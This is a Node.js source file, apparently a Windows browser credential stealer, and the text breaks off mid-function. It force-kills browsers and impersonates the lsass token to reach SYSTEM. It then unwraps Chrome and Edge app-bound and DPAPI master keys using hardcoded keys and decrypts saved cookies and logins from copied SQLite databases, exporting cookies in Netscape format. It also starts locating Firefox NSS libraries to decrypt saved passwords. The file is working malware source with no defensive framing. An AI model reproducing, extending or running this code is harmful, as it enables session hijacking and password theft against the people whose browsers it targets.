const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { pathToFileURL } = require('url');
const sqlite3 = require('sqlite3');
const koffi = require('koffi');
const dpapi = require('@primno/dpapi');
const libsodium = require('libsodium-wrappers');
const { execSync } = require('child_process');

koffi.struct('SECItem', {
    type: 'uint32',
    data: 'uint8 *',
    len: 'uint32'
});

const CHROME_AB_AES = Buffer.from(
    'B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787',
    'hex'
);
const CHROME_AB_CHACHA = Buffer.from(
    'E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660',
    'hex'
);
const CHROME_AB_XOR = Buffer.from(
    'CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390',
    'hex'
);

const BROWSER_EXE_NAMES = [
    'chrome.exe',
    'chromium.exe',
    'msedge.exe',
    'brave.exe',
    'opera.exe',
    'vivaldi.exe',
    'browser.exe',
    'firefox.exe',
    'waterfox.exe',
    'palemoon.exe'
];

async function killTargetBrowsers() {
    console.log('[*] Terminating browser processes (/T tree) so Cookie/Login DBs unlock…');
    for (const im of BROWSER_EXE_NAMES) {
        try {
            execSync(`taskkill /F /IM ${im} /T`, { stdio: 'ignore', windowsHide: true });
            console.log(`    [*] taskkill: ${im}`);
        } catch (e) {}
    }
    await sleep(3000);
    console.log('[*] Wait complete; extracting…');
}

function tryParseAppBoundU8(decrypted) {
    if (!decrypted || decrypted.length < 34) return null;
    const vdLen = decrypted.readUInt8(0);
    const keyLenOffset = 1 + vdLen;
    if (keyLenOffset + 1 + 32 > decrypted.length) return null;
    const keyLen = decrypted.readUInt8(keyLenOffset);
    const keyOff = keyLenOffset + 1;
    if (keyOff + keyLen > decrypted.length || keyLen !== 32) return null;
    return decrypted.slice(keyOff, keyOff + keyLen);
}

function tryParseAppBoundU32(decrypted) {
    if (!decrypted || decrypted.length < 4 + 4 + 32) return null;
    const vdLen = decrypted.readUInt32LE(0);
    if (vdLen > 0x100000 || vdLen + 8 + 32 > decrypted.length) return null;
    const keyLenOff = 4 + vdLen;
    if (keyLenOff + 4 > decrypted.length) return null;
    const keyLen = decrypted.readUInt32LE(keyLenOff);
    const keyOff = keyLenOff + 4;
    if (keyLen !== 32 || keyOff + 32 > decrypted.length) return null;
    return decrypted.slice(keyOff, keyOff + keyLen);
}

function collectAppBoundKeyCandidates(decrypted) {
    const raw = [];
    const a = tryParseAppBoundU8(decrypted);
    if (a) raw.push(a);
    const b = tryParseAppBoundU32(decrypted);
    if (b) raw.push(b);
    if (decrypted.length >= 32) raw.push(decrypted.slice(-32));
    const out = [];
    for (const k of raw) {
        if (!k || k.length !== 32) continue;
        if (!out.some(x => x.equals(k))) out.push(k);
    }
    return out;
}

function isEdgeChromiumUserData(browserPath) {
    return /[/\\]Microsoft[/\\]Edge[/\\]/i.test(browserPath);
}

function tryParseGoogleChromeAppBoundStructured(blob) {
    if (!blob || blob.length < 10) return null;
    const headerLen = blob.readUInt32LE(0);
    if (headerLen < 0 || headerLen > 65536) return null;
    if (blob.length < 8 + headerLen + 4) return null;
    const contentLen = blob.readUInt32LE(4 + headerLen);
    if (contentLen < 1 || contentLen > 65536) return null;
    const need = 8 + headerLen + contentLen;
    if (blob.length < need) return null;
    const content = blob.slice(8 + headerLen, need);
    const flag = content.readUInt8(0);
    if (flag !== 1 && flag !== 2 && flag !== 3) return null;
    return { flag, rest: content.slice(1) };
}

function ncryptDecryptGoogleChromeKey1(input32) {
    if (!input32 || input32.length !== 32) return null;
    const NCRYPT_SILENT_FLAG = 0x40;
    let ncrypt;
    try {
        ncrypt = koffi.load('ncrypt.dll');
    } catch (e) {
        return null;
    }
    const NCryptOpenStorageProvider = ncrypt.func(
        'uint32 NCryptOpenStorageProvider(_Out_ void **phProvider, str16 pszProviderName, uint32 dwFlags)'
    );
    const NCryptOpenKey = ncrypt.func(
        'uint32 NCryptOpenKey(void *hProvider, _Out_ void **phKey, str16 pszKeyName, uint32 dwLegacyKeySpec, uint32 dwFlags)'
    );
    const NCryptDecrypt = ncrypt.func(
        'uint32 NCryptDecrypt(void *hKey, void *pbInput, uint32 cbInput, void *pPaddingInfo, void *pbOutput, uint32 cbOutput, _Out_ uint32 *pcbResult, uint32 dwFlags)'
    );
    const NCryptFreeObject = ncrypt.func('uint32 NCryptFreeObject(void *hObject)');

    const phProv = [null];
    let st = NCryptOpenStorageProvider(phProv, 'Microsoft Software Key Storage Provider', 0);
    if (st !== 0) return null;

    const phKey = [null];
    st = NCryptOpenKey(phProv[0], phKey, 'Google Chromekey1', 0, 0);
    if (st !== 0) {
        NCryptFreeObject(phProv[0]);
        return null;
    }

    const pcb = [0];
    st = NCryptDecrypt(phKey[0], input32, input32.length, null, null, 0, pcb, NCRYPT_SILENT_FLAG);
    if (st !== 0) {
        NCryptFreeObject(phKey[0]);
        NCryptFreeObject(phProv[0]);
        return null;
    }
    const need = pcb[0];
    const out = Buffer.alloc(Math.max(need, 32));
    pcb[0] = out.length;
    st = NCryptDecrypt(phKey[0], input32, input32.length, null, out, out.length, pcb, NCRYPT_SILENT_FLAG);
    NCryptFreeObject(phKey[0]);
    NCryptFreeObject(phProv[0]);
    if (st !== 0) return null;
    return out.subarray(0, pcb[0]);
}

async function deriveGoogleChromeInnerAesKey(parsed) {
    const { flag, rest } = parsed;
    try {
        if (flag === 1) {
            if (rest.length < 12 + 32 + 16) return null;
            const iv = rest.slice(0, 12);
            const ciphertext = rest.slice(12, 44);
            const tag = rest.slice(44, 60);
            const decipher = crypto.createDecipheriv('aes-256-gcm', CHROME_AB_AES, iv);
            decipher.setAuthTag(tag);
            return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        }
        if (flag === 2) {
            if (rest.length < 12 + 32 + 16) return null;
            const iv = rest.slice(0, 12);
            const ciphertext = rest.slice(12, 44);
            const tag = rest.slice(44, 60);
            await libsodium.ready;
            const combined = Buffer.concat([ciphertext, tag]);
            return Buffer.from(
                libsodium.crypto_aead_chacha20poly1305_ietf_decrypt(null, combined, null, iv, CHROME_AB_CHACHA)
            );
        }
        if (flag === 3) {
            if (rest.length < 32 + 12 + 32 + 16) return null;
            const encKey = rest.slice(0, 32);
            const iv = rest.slice(32, 44);
            const ciphertext = rest.slice(44, 76);
            const tag = rest.slice(76, 92);
            const cng = await impersonate(() => ncryptDecryptGoogleChromeKey1(encKey));
            if (!cng || cng.length !== 32) return null;
            const aesKey = Buffer.alloc(32);
            for (let i = 0; i < 32; i++) aesKey[i] = cng[i] ^ CHROME_AB_XOR[i];
            const decipher = crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
            decipher.setAuthTag(tag);
            return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        }
    } catch (e) {
        return null;
    }
    return null;
}

async function impersonate(callback) {
    let dupToken = null;
    const kernel32 = koffi.load('kernel32.dll');
    const advapi32 = koffi.load('advapi32.dll');
    const OpenProcess = kernel32.func('void* OpenProcess(uint32, bool, uint32)');
    const GetCurrentProcess = kernel32.func('void* GetCurrentProcess()');
    const CloseHandle = kernel32.func('bool CloseHandle(void*)');
    const OpenProcessToken = advapi32.func('bool OpenProcessToken(void*, uint32, _Out_ void**)');
    const LookupPrivilegeValue = advapi32.func('bool LookupPrivilegeValueA(str, str, _Out_ int64*)');
    const AdjustTokenPrivileges = advapi32.func('bool AdjustTokenPrivileges(void*, bool, void*, uint32, void*, void*)');
    const DuplicateTokenEx = advapi32.func('bool DuplicateTokenEx(void*, uint32, void*, int, int, _Out_ void**)');
    const SetThreadToken = advapi32.func('bool SetThreadToken(void*, void*)');

    try {
        let token = [null];
        if (OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, token)) {
            let luid = [0n];
            if (LookupPrivilegeValue(null, 'SeDebugPrivilege', luid)) {
                const tp = Buffer.alloc(16);
                tp.writeUInt32LE(1, 0);
                tp.writeBigInt64LE(BigInt(luid[0]), 4);
                tp.writeUInt32LE(2, 12);
                AdjustTokenPrivileges(token[0], false, tp, 0, null, null);
                console.log('    [*] SeDebugPrivilege adjusted.');
            }
            CloseHandle(token[0]);
        }

        const tasks = execSync('tasklist /FI "IMAGENAME eq lsass.exe" /NH /FO CSV').toString();
        const lines = tasks.split('\n').filter(l => l.toLowerCase().includes('lsass.exe'));
        if (lines.length > 0) {
            const pid = parseInt(lines[0].split(',')[1].replace(/"/g, ''), 10);
            const hLsass = OpenProcess(0x1000, false, pid);
            if (hLsass) {
                console.log(`    [*] hLsass opened (PID: ${pid}).`);
                let lsassToken = [null];
                if (OpenProcessToken(hLsass, 0x0002 | 0x0004 | 0x0008, lsassToken)) {
                    let dup = [null];
                    if (DuplicateTokenEx(lsassToken[0], 0xF01FF, null, 2, 2, dup)) {
                        dupToken = dup[0];
                        if (SetThreadToken(null, dupToken)) {
                            console.log('    [+] Thread token set successfully.');
                        } else {
                            console.log('    [!] SetThreadToken failed.');
                        }
                    } else {
                        console.log('    [!] DuplicateTokenEx failed.');
                    }
                    CloseHandle(lsassToken[0]);
                } else {
                    console.log('    [!] OpenProcessToken failed.');
                }
                CloseHandle(hLsass);
            } else {
                console.log('    [!] Failed to open hLsass. Check Admin privileges.');
            }
        } else {
            console.log('    [!] lsass.exe not found in tasklist.');
        }
    } catch (e) {
        console.log(`    [!] Impersonate error: ${e.message}`);
    }

    const result = await callback();

    if (dupToken) {
        SetThreadToken(null, null);
        CloseHandle(dupToken);
        console.log('    [*] Reverted thread token.');
    }
    return result;
}

function normalizeKeyList(keys) {
    if (keys == null) return [];
    if (Buffer.isBuffer(keys)) return keys.length === 32 ? [keys] : [];
    return keys.filter(k => k && Buffer.isBuffer(k) && k.length === 32);
}

function decryptV20FlexibleSync(data, key) {
    if (!data || data.length < 32) return null;
    if (data.slice(0, 3).toString() !== 'v20') return null;
    const tag = data.slice(data.length - 16);
    for (let ivStart = 3; ivStart <= 16; ivStart++) {
        const ctStart = ivStart + 12;
        if (data.length < ctStart + 16 + 1) continue;
        const ciphertext = data.slice(ctStart, data.length - 16);
        if (ciphertext.length < 1) continue;
        try {
            const iv = data.slice(ivStart, ivStart + 12);
             const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
             decipher.setAuthTag(tag);
             return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        } catch (e) {}
    }
    return null;
}

function decryptV20WithKeys(data, keys) {
    for (const key of normalizeKeyList(keys)) {
        const plain = decryptV20FlexibleSync(data, key);
        if (plain) return plain;
    }
    return null;
}

function decryptV10V11GcmFlexibleBuffer(data, masterKey) {
    if (!data || !masterKey || masterKey.length < 16 || data.length < 3 + 12 + 16 + 1) return null;
    const head = data.slice(0, 3).toString();
    if (head !== 'v10' && head !== 'v11') return null;
    const tagLen = 16;
    const tag = data.slice(data.length - tagLen);
    const keyVariants = [];
    if (masterKey.length >= 32) keyVariants.push({ algo: 'aes-256-gcm', key: masterKey.subarray(0, 32) });
    if (masterKey.length >= 16) keyVariants.push({ algo: 'aes-128-gcm', key: masterKey.subarray(0, 16) });

    for (const { algo, key } of keyVariants) {
        for (const ivLen of [12, 16]) {
            for (let ivStart = 3; ivStart <= 16; ivStart++) {
                const ctStart = ivStart + ivLen;
                if (data.length < ctStart + tagLen + 1) continue;
                const iv = data.slice(ivStart, ivStart + ivLen);
                const ciphertext = data.slice(ctStart, data.length - tagLen);
                if (ciphertext.length < 1) continue;
                try {
                    const decipher = crypto.createDecipheriv(algo, key, iv);
                    decipher.setAuthTag(tag);
                    const out = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
                    if (out && out.length) return out;
                } catch (e) {}
            }
        }
    }
    return null;
}

function osCryptPlainToUtf8String(plainBuf) {
    if (!plainBuf || !plainBuf.length) return null;
    const fromCookie = cookiePlaintextToString(plainBuf);
    if (fromCookie) return fromCookie;
    const ascii = extractBestAsciiRunFromPlain(plainBuf);
    if (ascii && ascii.length >= 1) return ascii;
    const s = plainBuf.toString('utf8').replace(/\0+$/, '').trim();
    return s || null;
}

function decryptV10V11GcmFlexible(data, masterKey) {
    const buf = decryptV10V11GcmFlexibleBuffer(data, masterKey);
    if (!buf) return null;
    return osCryptPlainToUtf8String(buf);
}

function sqlBlobToBuffer(x) {
    if (x == null) return null;
    if (Buffer.isBuffer(x)) return x;
    if (x instanceof ArrayBuffer) return Buffer.from(x);
    if (ArrayBuffer.isView(x)) return Buffer.from(x.buffer, x.byteOffset, x.byteLength);
    if (typeof x === 'string') {
        const s = x.trim();
        if (s.length >= 16 && /^[A-Za-z0-9+/]+=*$/.test(s)) {
            try {
                const b = Buffer.from(s, 'base64');
                if (b.length >= 8) return b;
            } catch (e) {}
        }
    }
    return null;
}

function mostlyPrintableUtf8(s) {
    if (!s || !s.length) return false;
    const n = Math.min(s.length, 400);
    let bad = 0;
    for (let i = 0; i < n; i++) {
        const c = s.charCodeAt(i);
        if (c < 32 && c !== 9 && c !== 10 && c !== 13) bad++;
    }
    return bad / n < 0.25;
}

function cookiePlaintextToString(plain) {
    if (!plain || !plain.length) return null;
    const tries = [];
    if (plain.length > 32) tries.push(plain.slice(32).toString('utf8'));
    if (plain.length > 16) tries.push(plain.slice(16).toString('utf8'));
    tries.push(plain.toString('utf8'));
    for (const t of tries) {
        const s = t.replace(/\0+$/, '').trim();
        if (s && mostlyPrintableUtf8(s)) return s;
    }
    const fallback = tries[0] ? tries[0].replace(/\0+$/, '').trim() : '';
    return fallback || null;
}

function chromiumCookieValueToExportString(s) {
    if (!s) return '';
    return String(s)
        .replace(/\r|\n|\t/g, ' ')
        .replace(/\s+/g, ' ')
        .trim()
        .slice(0, 4096);
}

function isLikelyValidCookiePlaintext(s) {
    if (!s || typeof s !== 'string') return false;
    if (s.length < 1 || s.length > 8192) return false;
    if (/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/.test(s)) return false;
    let ascii = 0;
    for (let i = 0; i < s.length; i++) {
        const c = s.charCodeAt(i);
        if (c >= 32 && c <= 126) ascii++;
    }
    return ascii / s.length >= 0.88;
}

function isCookieSafeForExport(s) {
    if (!s || typeof s !== 'string') return false;
    if (s.length < 1 || s.length > 8192) return false;
    return !/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/.test(s);
}

function extractBestAsciiRunFromPlain(plain) {
    if (!plain || !plain.length) return null;
    let best = '';
    let cur = '';
    for (let i = 0; i < plain.length; i++) {
        const b = plain[i];
        if (b >= 0x20 && b <= 0x7e) cur += String.fromCharCode(b);
        else {
            if (cur.length > best.length) best = cur;
            cur = '';
        }
    }
    if (cur.length > best.length) best = cur;
    return best.length >= 1 ? best : null;
}

const CHROME_COOKIE_EPOCH_OFFSET_US = 11644473600000000n;

function chromiumCookieExpiresToUnixSeconds(expiresUtc, hasExpires) {
    if (hasExpires === 0 || hasExpires === false) return 0;
    if (expiresUtc == null || expiresUtc === '') return 0;
    const n = Number(expiresUtc);
    if (!Number.isFinite(n) || n <= 0) return 0;
    try {
        const us = BigInt(Math.trunc(n));
        const unixUs = us - CHROME_COOKIE_EPOCH_OFFSET_US;
        if (unixUs < 0n) return 0;
        const sec = Number(unixUs / 1000000n);
        return Number.isFinite(sec) && sec > 0 ? sec : 0;
    } catch (e) {
        return 0;
    }
}

function netscapeCookieLine(row, value) {
    const domain = row.host_key || '';
    const includeSubdomains = domain.startsWith('.') ? 'TRUE' : 'FALSE';
    const p = row.path && String(row.path).length ? String(row.path) : '/';
    const secure = row.is_secure === 1 || row.is_secure === true ? 'TRUE' : 'FALSE';
    const exp = chromiumCookieExpiresToUnixSeconds(row.expires_utc, row.has_expires);
    const name = row.name || '';
    return `${domain}\t${includeSubdomains}\t${p}\t${secure}\t${exp}\t${name}\t${value}\n`;
}

async function decryptChromiumCookieValue(blob, keys) {
    const data = sqlBlobToBuffer(blob);
    if (!data || data.length < 15) return null;
    const keyList = normalizeKeyList(keys);
    if (!keyList.length) return null;
    const head = data.slice(0, 3).toString();

    if (head === 'v20') {
        const plain = decryptV20WithKeys(data, keyList);
        for (const candidate of [
            cookiePlaintextToString(plain),
            extractBestAsciiRunFromPlain(plain),
            plain && plain.length > 32 ? plain.slice(32).toString('latin1') : null
        ]) {
            if (candidate && (isLikelyValidCookiePlaintext(candidate) || isCookieSafeForExport(candidate))) {
                return chromiumCookieValueToExportString(candidate);
            }
        }
        const viaValue = await decryptValue(data, keyList);
        if (viaValue && (isLikelyValidCookiePlaintext(viaValue) || isCookieSafeForExport(viaValue))) {
            return chromiumCookieValueToExportString(viaValue);
        }
        return null;
    }

    const v = await decryptValue(data, keyList);
    if (!v) return null;
    if (isLikelyValidCookiePlaintext(v) || isCookieSafeForExport(v)) {
        return chromiumCookieValueToExportString(v);
    }
    return null;
}

async function chromiumCookieDisplayValue(row, keys) {
    let val = await decryptChromiumCookieValue(row.encrypted_value, keys);
    if (val) return val;
    const vb = sqlBlobToBuffer(row.value);
    if (vb && vb.length > 0 && vb.length < 15) {
        const shortUtf8 = vb.toString('utf8');
        if (isLikelyValidCookiePlaintext(shortUtf8)) return chromiumCookieValueToExportString(shortUtf8);
    }
    if (vb && vb.length >= 15) {
        const h = vb.slice(0, 3).toString();
        if (h === 'v10' || h === 'v11' || h === 'v20') {
            val = await decryptChromiumCookieValue(vb, keys);
            if (val) return val;
        }
        const dec = await decryptValue(vb, keys);
        if (dec && (isLikelyValidCookiePlaintext(dec) || isCookieSafeForExport(dec))) {
            return chromiumCookieValueToExportString(dec);
        }
    }
    if (typeof row.value === 'string' && row.value.length) {
        if (isLikelyValidCookiePlaintext(row.value)) return chromiumCookieValueToExportString(row.value);
    }
    return null;
}

async function getMasterKeyChromium(browserPath) {
    const localStatePath = path.join(browserPath, 'Local State');
    console.log(`    [*] Looking for Local State at: ${localStatePath}`);
    if (!fs.existsSync(localStatePath)) {
        console.log('    [!] Local State not found.');
        return null;
    }
    try {
        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        if (localState.os_crypt.app_bound_encrypted_key) {
            console.log('    [*] App-Bound key (v20) detected.');
            let encryptedKey = Buffer.from(localState.os_crypt.app_bound_encrypted_key, 'base64');
            console.log(`    [*] Encrypted Key Prefix: ${encryptedKey.slice(0, 4).toString()} (${encryptedKey.slice(0, 4).toString('hex')})`);
            
            let firstUnprotect;
            try {
                firstUnprotect = await impersonate(() =>
                    dpapi.Dpapi.unprotectData(encryptedKey.slice(4), null, 'CurrentUser')
                );
            } catch (e) {
                console.log(`    [!] First unprotect failed: ${e.message}`);
                return null;
            }

            let decrypted;
            try {
                decrypted = dpapi.Dpapi.unprotectData(firstUnprotect, null, 'CurrentUser');
            } catch (e) {
                console.log(`    [!] Second unprotect failed: ${e.message}`);
                return null;
            }
            if (isEdgeChromiumUserData(browserPath)) {
                if (decrypted.length < 32) {
                    console.log('    [!] Edge app-bound blob too short.');
                    return null;
                }
                const k = decrypted.slice(-32);
                console.log('    [+] App-bound (Edge): AES key = last 32 bytes after user DPAPI.');
                return { keys: [k] };
            }

            const structured = tryParseGoogleChromeAppBoundStructured(decrypted);
            if (structured) {
                console.log(`    [*] Chrome app-bound inner blob (flag ${structured.flag}).`);
                const innerKey = await deriveGoogleChromeInnerAesKey(structured);
                if (innerKey && innerKey.length === 32) {
                    console.log('    [+] App-bound (Chrome): inner decrypt OK → 32-byte AES key.');
                    return { keys: [innerKey] };
                }
                console.log(`    [!] Chrome inner key decrypt failed (flag ${structured.flag}); trying heuristics.`);
            }

            const candidates = collectAppBoundKeyCandidates(decrypted);
            if (!candidates.length) {
                console.log('    [!] Could not derive key material from app-bound blob.');
                return null;
            }
            console.log(`    [+] App-bound: ${candidates.length} heuristic key candidate(s).`);
            return { keys: candidates };
        }
        console.log('    [*] Standard v10 key detected.');
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
        const k = dpapi.Dpapi.unprotectData(encryptedKey, null, 'CurrentUser');
        return { keys: [k] };
    } catch (e) {
        console.log(`    [!] getMasterKey failed: ${e.message}`);
        return null;
    }
}

function isDir(p) {
    try {
        return fs.statSync(p).isDirectory();
    } catch {
        return false;
    }
}

function listChromiumProfiles(userDataRoot) {
    const out = [];
    if (!fs.existsSync(userDataRoot)) return out;
    for (const name of fs.readdirSync(userDataRoot)) {
        const full = path.join(userDataRoot, name);
        if (!isDir(full)) continue;
        if (name === 'Default' || name.startsWith('Profile ')) {
            if (fs.existsSync(path.join(full, 'Preferences')) || fs.existsSync(path.join(full, 'Login Data'))) {
                out.push(name);
            }
        }
    }
    const sideRoot = path.join(userDataRoot, '_side_profiles');
    if (fs.existsSync(sideRoot)) {
        for (const sub of fs.readdirSync(sideRoot)) {
            const subPath = path.join(sideRoot, sub);
            if (!isDir(subPath)) continue;
            for (const prof of fs.readdirSync(subPath)) {
                const full = path.join(subPath, prof);
                if (!isDir(full)) continue;
                if (prof === 'Default' || prof.startsWith('Profile ')) {
                    if (fs.existsSync(path.join(full, 'Preferences')) || fs.existsSync(path.join(full, 'Login Data'))) {
                        out.push(path.relative(userDataRoot, full));
                    }
                }
            }
        }
    }
    return out;
}

function isCopyBlockedError(e) {
    const c = e && e.code;
    return c === 'EBUSY' || c === 'EPERM' || c === 'EACCES' || c === 'UNKNOWN';
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

function normalizeDbPath(dbPath) {
    try {
        return fs.realpathSync.native(dbPath);
    } catch {
        return path.resolve(dbPath);
    }
}

function getWindowsShortPath(longPath) {
    try {
        const abs = path.resolve(longPath);
        const escaped = abs.replace(/"/g, '""');
        const out = execSync(`cmd /c for %I in ("${escaped}") do @echo %~sI`, {
            encoding: 'utf8',
            windowsHide: true,
            timeout: 8000
        });
        const short = out
            .trim()
            .split(/\r?\n/)
            .filter(Boolean)
            .pop()
            .trim();
        if (short && fs.existsSync(short)) return short;
    } catch (e) {}
    return null;
}

function winLongPathPrefix(absPath) {
    const abs = path.resolve(absPath);
    if (abs.startsWith('\\\\?\\')) return abs;
    return '\\\\?\\' + abs.replace(/\//g, '\\');
}

async function copyFileWithRetry(src, dst, tries = 18, delayMs = 350) {
    let lastErr;
    for (let i = 0; i < tries; i++) {
        try {
            fs.copyFileSync(src, dst);
            return true;
        } catch (e) {
            lastErr = e;
            if (i < tries - 1) await sleep(delayMs);
        }
    }
    throw lastErr;
}

function sqliteFileUri(absDbPath, { immutable = false } = {}) {
    let p = path.resolve(absDbPath);
    if (p.startsWith('\\\\?\\')) {
        p = p.replace(/^\\\\\?\\/, '');
    }
    const href = pathToFileURL(p).href;
    const q = immutable ? 'mode=ro&immutable=1' : 'mode=ro';
    return `${href}?${q}`;
}

function tryCopySqliteWithWalShm(srcMainPath, destDir) {
    const baseName = path.basename(srcMainPath);
    const wal = `${srcMainPath}-wal`;
    const shm = `${srcMainPath}-shm`;
    fs.mkdirSync(destDir, { recursive: true });
    const dMain = path.join(destDir, baseName);
    const dWal = path.join(destDir, `${baseName}-wal`);
    const dShm = path.join(destDir, `${baseName}-shm`);
    fs.copyFileSync(srcMainPath, dMain);
    if (fs.existsSync(wal)) fs.copyFileSync(wal, dWal);
    if (fs.existsSync(shm)) fs.copyFileSync(shm, dShm);
    return dMain;
}

async function query(dbPath, sql) {
    if (!fs.existsSync(dbPath)) return [];
    const abs = normalizeDbPath(dbPath);
    const tmpPath = path.join(process.env.TEMP, `tmp_${crypto.randomBytes(4).toString('hex')}.db`);
    const tmpWalDir = path.join(process.env.TEMP, `wal_${crypto.randomBytes(4).toString('hex')}`);

    const runAll = (openPath, flags, unlinkPath, rmDir) =>
        new Promise(resolve => {
            const readOnly = (flags & sqlite3.OPEN_READONLY) !== 0;
            const db = new sqlite3.Database(openPath, flags, errOpen => {
                if (errOpen) {
                    if (unlinkPath) {
                        try {
                            fs.unlinkSync(unlinkPath);
                        } catch (e) {}
                    }
                    if (rmDir) {
                        try {
                            fs.rmSync(rmDir, { recursive: true, force: true });
                        } catch (e) {}
                    }
                    return resolve({ ok: false, err: errOpen });
                }
                db.configure('busyTimeout', 25000);
                db.serialize(() => {
                    if (readOnly) {
                        db.run('PRAGMA query_only = ON');
                    }
                    db.all(sql, (err, rows) => {
                        db.close(() => {
                            if (unlinkPath) {
                                try {
                                    fs.unlinkSync(unlinkPath);
                                } catch (e) {}
                            }
                            if (rmDir) {
                                try {
                                    fs.rmSync(rmDir, { recursive: true, force: true });
                                } catch (e) {}
                            }
                            if (err) {
                                console.log(`    [!] SQLite query failed — ${err.message}`);
                                return resolve({ ok: true, rows: [] });
                            }
                            resolve({ ok: true, rows: rows || [] });
                        });
                    });
                });
            });
        });

    try {
        await copyFileWithRetry(abs, tmpPath, 20, 400);
        const r = await runAll(tmpPath, sqlite3.OPEN_READWRITE, tmpPath, null);
        if (r.ok) return r.rows;
    } catch (e) {
        try {
            if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath);
        } catch (e2) {}
        if (isCopyBlockedError(e)) {
            console.log(`    [*] DB still locked after retries: ${path.basename(abs)}`);
        } else {
            console.log(`    [*] Copy failed (${e.code || e.message}): ${path.basename(abs)}`);
        }
    }

    for (let attempt = 0; attempt < 12; attempt++) {
        try {
            tryCopySqliteWithWalShm(abs, tmpWalDir);
            const r = await runAll(
                path.join(tmpWalDir, path.basename(abs)),
                sqlite3.OPEN_READWRITE,
                null,
                tmpWalDir
            );
            if (r.ok) {
                console.log(`    [+] Opened via WAL/SHM copy: ${path.basename(abs)}`);
                return r.rows;
            }
        } catch (e) {
            try {
                if (fs.existsSync(tmpWalDir)) fs.rmSync(tmpWalDir, { recursive: true, force: true });
            } catch (e2) {}
        }
        await sleep(400);
    }

    const openCandidates = [
        { p: abs, label: 'resolved path' },
        { p: winLongPathPrefix(abs), label: '\\\\?\\ long path' }
    ];
    const short = getWindowsShortPath(abs);
    if (short && short !== abs) {
        openCandidates.push({ p: short, label: '8.3 short path' });
        openCandidates.push({ p: winLongPathPrefix(short), label: '8.3 + \\\\?\\' });
    }

    for (const { p, label } of openCandidates) {
        for (const immutable of [true, false]) {
            const uri = sqliteFileUri(p, { immutable });
            const tag = `${label} / ${immutable ? 'immutable' : 'ro'}`;
            const r = await runAll(uri, sqlite3.OPEN_READONLY | sqlite3.OPEN_URI, null, null);
            if (r.ok) {
                console.log(`    [+] ${path.basename(abs)}: OK (${tag}).`);
                return r.rows;
            }
        }
        const r2 = await runAll(p, sqlite3.OPEN_READONLY, null, null);
        if (r2.ok) {
            console.log(`    [+] ${path.basename(abs)}: OK (${label} read-only).`);
            return r2.rows;
        }
    }

    if (path.basename(abs).toLowerCase() === 'cookies') {
        console.log(
            '    [!] Chrome Cookies: could not open while browser is running. Close all Chrome windows, wait ~5s, run again — or copy Default\\Network\\Cookies* manually when Chrome is off.'
        );
    } else {
        console.log(`    [!] SQLite: could not open ${path.basename(abs)}`);
    }
    return [];
}

async function decryptValue(data, keys) {
    if (!data || data.length < 15) return null;
    const keyList = normalizeKeyList(keys);
    if (!keyList.length) return null;
    const head = data.slice(0, 3).toString();
    try {
        if (head === 'v10' || head === 'v11') {
            for (const masterKey of keyList) {
                const out = decryptV10V11GcmFlexible(data, masterKey);
                if (out) return out;
            }
            return null;
        }
        if (head === 'v20') {
            const plain = decryptV20WithKeys(data, keyList);
            if (!plain || !plain.length) return null;
            const full = plain.toString('utf8').replace(/\0+$/, '').trim();
            if (mostlyPrintableUtf8(full)) return full;
            if (plain.length > 32) {
                const tail = plain.slice(32).toString('utf8').replace(/\0+$/, '').trim();
                if (tail && mostlyPrintableUtf8(tail)) return tail;
            }
            return full || null;
        }
    } catch (e) {
        return null;
    }
    return null;
}

function firefoxInstallDirs() {
    const out = [];
    const seen = new Set();
    function add(p) {
        if (!p || typeof p !== 'string') return;
        const n = path.resolve(path.normalize(p.trim()));
        if (seen.has(n)) return;
        seen.add(n);
        if (fs.existsSync(path.join(n, 'nss3.dll'))) out.push(n);
    }

    if (process.env.FIREFOX_INSTALL_DIR) add(process.env.FIREFOX_INSTALL_DIR);

    add(path.join(process.env.PROGRAMFILES || '', 'Mozilla Firefox'));
    add(path.join(process.env['PROGRAMFILES(X86)'] || '', 'Mozilla Firefox'));
    add(path.join(process.env.LOCALAPPDATA || '', 'Mozilla Firefox'));
    add(path.join(process.env.PROGRAMFILES || '', 'Firefox Developer Edition'));
    add(path.join(process.env['PROGRAMFILES(X86)'] || '', 'Firefox Developer Edition'));

    function regInstallDir(base) {
        try {
            const q1 = execSync(`reg query "${base}\\Mozilla\\Mozilla Firefox" /v CurrentVersion`, {
                encoding: 'utf8',
                windowsHide: true,
                timeout: 8000,
                stdio: ['ignore', 'pipe', 'ignore']
            });
            const mv = q1.match(/CurrentVersion\s+REG_\w+\s+(\S+)/i);
            if (!mv) return;
            const q2 = execSync(
                `reg query "${base}\\Mozilla\\Mozilla Firefox\\${mv[1]}\\Main" /v InstallDirectory`,
                { encoding: 'utf8', windowsHide: true, timeout: 8000, stdio: ['ignore', 'pipe', 'ignore'] }
            );
            const iv = q2.match(/InstallDirectory\s+REG_\w+\s*(.+)/i);
            if (iv) add(iv[1].trim());
        } catch (e) {}
    }
    regInstallDir('HKLM\\SOFTWARE');
    regInstallDir('HKCU\\SOFTWARE');

    return out;
}

const FIREFOX_NSS_CK_ID = Buffer.from([0xf8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
const PKCS5_PBES2_OID = Buffer.from([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x05, 0x0d]);

function firefoxDerReadLength(buf, off) {
    let len = buf[off++];
    if (len & 0x80) {
        const n = len & 0x7f;
        len = 0;
        for (let i = 0; i < n; i++) len = (len << 8) | buf[off++];
    }
    return { len, next: off };
}

function firefoxDerTlv(buf, off) {
    const tag = buf[off++];
